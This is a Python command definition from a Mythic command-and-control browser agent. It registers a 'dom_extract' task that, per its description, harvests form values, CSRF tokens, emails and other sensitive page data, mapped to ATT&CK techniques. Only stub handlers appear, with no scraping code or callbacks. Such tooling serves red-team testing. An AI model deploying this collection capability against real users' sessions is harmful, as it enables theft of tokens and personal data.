from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class DomExtractArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class DomExtractCommand(CommandBase):
    cmd = "dom_extract"
    needs_admin = False
    help_cmd = "dom_extract"
    description = "Scrape the page DOM for sensitive data: forms with values, hidden inputs (CSRF tokens), email addresses, meta tags, HTML comments, external scripts, and iframes."
    version = 1
    author = "@grampae"
    attackmapping = ["T1005", "T1213"]
    argument_class = DomExtractArguments
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Browser]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        return task

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
